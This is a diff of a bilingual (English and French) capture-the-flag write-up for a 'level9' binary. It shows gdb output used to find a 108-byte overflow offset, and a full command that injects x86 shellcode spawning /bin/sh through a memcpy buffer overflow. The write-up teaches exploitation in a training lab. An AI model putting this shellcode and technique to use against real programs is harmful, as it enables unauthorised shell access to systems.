@@ -1,1 +1,37 @@
-./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'`
+There is no call to /bin/sh, so we can assume that we will use a shellcode injection.
+
+Lets try to overflow him with a pattern generator to get an offset.
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+
+(gdb) info register eax
+eax            0x41366441       1094083649
+
+Use 0x41366441 in our pattern genetor, we get offset 108
+
+The segfault happens on the byte 108.
+
+./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"'`
+
+
+-------
+
+Grâce à gdb on voit que le binaire fait un memcpy sur un buffer de 100, on peut donc réaliser un buffoverflow.
+Il n'y a pas de call à /bin/sh donc on peut se dire qu'on va faire un shellcode injection
+
+Pour trouver l'adresse on s'aide d'un buffer overflow pattern generator,
+
+
+$ gdb level9
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+
+(gdb) info register eax
+eax            0x41366441       1094083649
+
+Use 0x41366441 in our pattern genetor, we get offset 108
